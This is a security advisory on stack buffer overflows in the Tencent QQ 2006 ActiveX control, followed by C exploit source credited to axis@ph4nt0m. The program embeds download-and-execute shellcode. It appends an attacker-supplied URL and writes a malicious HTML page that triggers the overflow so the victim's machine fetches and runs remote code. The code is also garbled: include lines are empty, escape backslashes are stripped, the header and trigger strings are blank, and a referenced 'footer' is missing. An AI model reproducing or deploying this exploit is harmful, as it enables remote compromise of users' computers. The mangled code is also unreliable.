source: http://www.securityfocus.com/bid/26613/info

Tencent QQ is prone to multiple stack-based buffer-overflow vulnerabilities because the application fails to perform adequate boundary checks on user-supplied data.

Successfully exploiting these issues allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.

These issues affect Tencent QQ 2006 and prior versions. 

 #include

  #include

  #include

  FILE *fp = NULL;

  char *file = "fuck_exp1.html";

  char *url = NULL;

  unsigned char sc[] =

  "x60x64xa1x30x00x00x00x8bx40x0cx8bx70x1cxadx8bx70"

  "x08x81xecx00x04x00x00x8bxecx56x68x8ex4ex0execxe8"

  "xffx00x00x00x89x45x04x56x68x98xfex8ax0exe8xf1x00"

  "x00x00x89x45x08x56x68x25xb0xffxc2xe8xe3x00x00x00"

  "x89x45x0cx56x68xefxcexe0x60xe8xd5x00x00x00x89x45"

  "x10x56x68xc1x79xe5xb8xe8xc7x00x00x00x89x45x14x40"

  "x80x38xc3x75xfax89x45x18xe9x08x01x00x00x5ex89x75"

  "x24x8bx45x04x6ax01x59x8bx55x18x56xe8x8cx00x00x00"

  "x50x68x36x1ax2fx70xe8x98x00x00x00x89x45x1cx8bxc5"

  "x83xc0x50x89x45x20x68xffx00x00x00x50x8bx45x14x6a"

  "x02x59x8bx55x18xe8x62x00x00x00x03x45x20xc7x00x5c"

  "x7ex2ex65xc7x40x04x78x65x00x00xffx75x20x8bx45x0c"

  "x6ax01x59x8bx55x18xe8x41x00x00x00x6ax07x58x03x45"

  "x24x33xdbx53x53xffx75x20x50x53x8bx45x1cx6ax05x59"

  "x8bx55x18xe8x24x00x00x00x6ax00xffx75x20x8bx45x08"

  "x6ax02x59x8bx55x18xe8x11x00x00x00x81xc4x00x04x00"

  "x00x61x81xc4xdcx04x00x00x5dxc2x24x00x41x5bx52x03"

  "xe1x03xe1x03xe1x03xe1x83xecx04x5ax53x8bxdaxe2xf7"

  "x52xffxe0x55x8bxecx8bx7dx08x8bx5dx0cx56x8bx73x3c"

  "x8bx74x1ex78x03xf3x56x8bx76x20x03xf3x33xc9x49x41"

  "xadx03xc3x56x33xf6x0fxbex10x3axf2x74x08xc1xcex0d"

  "x03xf2x40xebxf1x3bxfex5ex75xe5x5ax8bxebx8bx5ax24"

  "x03xddx66x8bx0cx4bx8bx5ax1cx03xddx8bx04x8bx03xc5"

  "x5ex5dxc2x08x00xe8xf3xfexffxffx55x52x4cx4dx4fx4e"

  "x00";

  char * header =

  " "

  " "

  " "

  " ";

  char * trigger =

  " "

  " "

  " "

  " "

  " ";

  // print unicode shellcode

  void PrintPayLoad(char *lpBuff, int buffsize)

  {

  int i;

  for(i=0;i{

  if((i%16)==0)

  {

  if(i!=0)

  {

  printf("" "");

  fprintf(fp, "%s", "" + "");

  }

  else

  {

  printf(""");

  fprintf(fp, "%s", """);

  }

  }

  printf("%%u%0.4x",((unsigned short*)lpBuff)[i/2]);

  fprintf(fp, "%%u%0.4x",((unsigned short*)lpBuff)[i/2]);

  }

  //?shellcode???header??,??? " ) " ??

  printf(""; ");

  fprintf(fp, "%s", ""); ");

  fflush(fp);

  }

  void main(int argc, char **argv)

  {

  unsigned char buf[1024] = {0};

  int sc_len = 0;

  if (argc < 2)

  {

  printf("Tencent QQ VQQPlayer.ocx (all version) 0day! ");

  printf("Bug Found by axis@ph4nt0m ");

  printf("Date: 2006-12-27 ");

  printf(" Usage: %s [Local htmlfile] ", argv[0]);

  exit(1);

  }

  url = argv[1];

  if( (!strstr(url, "http://") && !strstr(url, "ftp://"))    strlen(url) < 10)

  {

  printf("[-] Invalid url. Must start with 'http://','ftp://' ");

  return;

  }

  printf("[+] download url:%s ", url);

  if(argc >=3) file = argv[2];

  printf("[+] exploit file:%s ", file);

  fp = fopen(file, "w");

  if(!fp)

  {

  printf("[-] Open file error! ");

  return;

  }

  //build evil html file

  fprintf(fp, "%s", header);

  fflush(fp);

  memset(buf, 0, sizeof(buf));

  sc_len = sizeof(sc)-1;

  memcpy(buf, sc, sc_len);

  memcpy(buf+sc_len, url, strlen(url));

  sc_len += strlen(url)+1;

  PrintPayLoad((char *)buf, sc_len);

  fprintf(fp, "%s", footer);

  fflush(fp);

  fprintf(fp, "%s", trigger);

  fflush(fp);

  printf("[+] exploit write to %s success! ", file);

  }